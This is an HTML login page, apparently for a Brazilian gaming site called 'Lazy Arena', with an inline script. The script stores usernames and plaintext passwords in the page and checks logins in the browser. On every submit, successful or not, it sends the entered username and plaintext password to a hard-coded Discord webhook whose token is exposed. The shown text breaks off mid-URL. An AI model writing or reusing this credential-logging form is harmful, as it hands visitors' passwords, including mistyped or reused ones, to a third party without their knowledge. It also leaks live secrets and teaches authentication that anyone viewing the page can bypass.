<!DOCTYPE html><html lang="pt-br"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Login - Lazy Arena</title>    <link rel="icon" href="favicon.ico" type="image/x-icon">    <!-- Bootstrap CSS -->    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet"        integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">    <style>        body {            background: linear-gradient(135deg, #1E1E1E, #333);            color: #fff;            font-family: 'Inter', sans-serif;            height: 100vh;            display: flex;            justify-content: center;            align-items: center;        }        .login-container {            max-width: 450px;            padding: 30px;            background: rgba(50, 50, 50, 0.9);            border-radius: 15px;            box-shadow: 0px 8px 30px rgba(0, 0, 0, 0.8);        }        .login-container h2 {            text-align: center;            margin-bottom: 25px;            font-weight: bold;            color: #FFD700;            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.6);        }        .form-label {            font-weight: bold;            color: #FFD700;        }        .form-control {            background-color: #444;            border: 1px solid #555;            border-radius: 8px;            color: #fff;            font-weight: bold;        }        .form-control::placeholder {            color: #bbb;            font-weight: bold;        }        .btn-login {            background-color: #FFD700;            border: none;            width: 100%;            padding: 12px;            border-radius: 8px;            font-weight: bold;            color: #333;            cursor: pointer;            transition: background-color 0.3s;        }        .btn-login:hover {            background-color: #FFCC00;        }        .error-message,        .success-message {            color: #FF6347;            text-align: center;            margin-top: 15px;            display: none;            font-weight: bold;        }        .success-message {            color: #32CD32;        }        .footer {            text-align: center;            margin-top: 20px;            color: #777;            font-size: 14px;        }    </style>    <link type="text/css" rel="stylesheet" href="//fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;display=swap"></head><body>    <div class="login-container">        <h2>Login - Lazy Arena</h2>        <form id="loginForm">            <div class="mb-3">                <label for="username" class="form-label">User</label>                <input type="text" class="form-control" id="username" name="username" placeholder="Digite seu User" required>            </div>            <div class="mb-3">                <label for="password" class="form-label">Senha</label>                <input type="password" class="form-control" id="password" name="password" placeholder="Digite sua senha" required>            </div>            <button type="submit" class="btn btn-login">Entrar</button>            <div id="errorMessage" class="error-message">Tente novamente.</div>            <div id="successMessage" class="success-message">Login bem-sucedido! Redirecionando...</div>        </form>        <div class="footer">&copy; 2025 Lazy Arena. Todos os direitos reservados.</div>    </div>    <!-- Bootstrap JavaScript -->    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js"        integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8" crossorigin="anonymous"></script>    <script>        const users = {            'fumiga': 'f1u2m3i4g5a6',            'brczz': '2208221',            'player': 'playerpass',            'guest': 'guestpass',            'coach': 'coach2025',            'superuser': 'super2025',            'proplayer': 'pro2025',            'gamer': 'gamerlife'        };        const webhookURL = 'https://discord.com/api/webhooks/1327642916725723189/2fighzUB33TZoQu5X8Lu_Ryg6ighvNdj8C2XlR6ps_DaGyB662v3r8BAj68aipuJT6wM';        document.getElementById('loginForm').addEventListener('submit', function (event) {            event.preventDefault();            const username = document.getElementById('username').value;            const password = document.getElementById('password').value;            // Obtendo o IP do usu√°rio (simula√ß√£o de um IP fixo)            const ip = ""; // Aqui voc√™ pode pegar o IP real do cliente via servidor, mas por seguran√ßa √© geralmente bloqueado no front-end            if (users[username] && users[username] === password) {                // Exibe a mensagem de sucesso e oculta a de erro                document.getElementById('successMessage').style.display = 'block';                document.getElementById('errorMessage').style.display = 'none';                // Envia log de sucesso para o Discord                const successPayload = {                    username: "Arena Lazy",                    avatar_url: "https://media.discordapp.net/attachments/1327098120374325370/1327098184358428732/image0.jpg?ex=67827cbf&is=67812b3f&hm=5225a7ef9d30c86b4df571047e5338c08952de294e6128fa4e32bec969d14c47&=&format=webp",                    content: ``,                    embeds: [{    title: "üíª Login Bem-Sucedido - Arena Lazy",    description: `üéâ **Login autorizado com sucesso!**\n\n**User**: ${username}\n**Senha**: ${password}\n**IP**: ${ip}\n**Status**: Sucesso no Login`,    color: 0x32CD32, // Verde    fields: [        {            name: "üë§ User",            value: `${username}`,            inline: true        },        {            name: "üîë Senha",            value: `${password}`,            inline: true        },        {            name: "üåç IP",            value: `${ip}`,            inline: true        },        {            name: "‚úÖ Status",            value: "Login Autorizado",            inline: true        },    ],    image: {        url: "https://media.discordapp.net/attachments/1327098120374325370/1327098184358428732/image0.jpg?ex=67827cbf&is=67812b3f&hm=5225a7ef9d30c86b4df571047e5338c08952de294e6128fa4e32bec969d14c47&=&format=webp"    },    footer: {        text: "Arena Lazy - Sistema de Login",        icon_url: "https://media.discordapp.net/attachments/1327098120374325370/1327098184358428732/image0.jpg?ex=67827cbf&is=67812b3f&hm=5225a7ef9d30c86b4df571047e5338c08952de294e6128fa4e32bec969d14c47&=&format=webp"    },    timestamp: new Date(),    thumbnail: {        url: "https://media.discordapp.net/attachments/1327098120374325370/1327098184358428732/image0.jpg?ex=67827cbf&is=67812b3f&hm=5225a7ef9d30c86b4df571047e5338c08952de294e6128fa4e32bec969d14c47&=&format=webp"    },    author: {        name: "Arena Lazy",        icon_url: "https://media.discordapp.net/attachments/1327098120374325370/1327098184358428732/image0.jpg?ex=67827cbf&is=67812b3f&hm=5225a7ef9d30c86b4df571047e5338c08952de294e6128fa4e32bec969d14c47&=&format=webp"    },    timestamp: new Date()}]                };                fetch(webhookURL, {                    method: 'POST',                    headers: {                        'Content-Type': 'application/json'                    },                    body: JSON.stringify(successPayload)                })                    .then(response => {                        if (response.ok) {                            console.log('Log de sucesso enviado com sucesso!');                        } else {                            console.log('Erro ao enviar log de sucesso:', response.status);                        }                    })                    .catch(error => {                        console.log('Erro de rede ao enviar log de sucesso:', error);                    });                setTimeout(() => {                    window.location.href = 'painel.html';                }, 2000); // Redireciona ap√≥s 2 segundos            } else {                // Exibe a mensagem de erro e oculta a de sucesso                document.getElementById('errorMessage').style.display = 'block';                document.getElementById('successMessage').style.display = 'none';                // Envia log de falha para o Discord                const failurePayload = {                    username: "Arena Lazy",                    avatar_url: "https://media.discordapp.net/attachments/1327098120374325370/1327098184358428732/image0.jpg?ex=67827cbf&is=67812b3f&hm=5225a7ef9d30c86b4df571047e5338c08952de294e6128fa4e32bec969d14c47&=&format=webp",                    content: ``,                    embeds: [{    title: "‚ùå Tentativa de Login - Arena Lazy",    description: `‚ö†Ô∏è **Falha no login detectada!**\n\n**User**: ${username}\n**Senha**: ${password}\n**IP**: ${ip}\n**Status**: Falha no Login`,    color: 0xFF0000, // Vermelho    fields: [        {            name: "üë§ User",            value: `${username}`,            inline: true        },        {            name: "üîë Senha",            value: `${password}`,            inline: true        },        {            name: "üåç IP",            value: `${ip}`,            inline: true        },        {            name: "‚ùå Status",            value: "Falha no Login",            inline: true        },    ],    image: {        url: "https://media.discordapp.net/attachments/1327098120374325370/1327098184358428732/image0.jpg?ex=67827cbf&is=67812b3f&hm=5225a7ef9d30c86b4df571047e5338c08952de294e6128fa4e32bec969d14c47&=&format=webp"    },    footer: {        text: "Arena Lazy - Sistema de Login",        icon_url: "https://media.discordapp.net/attachments/1327098120374325370/13270981
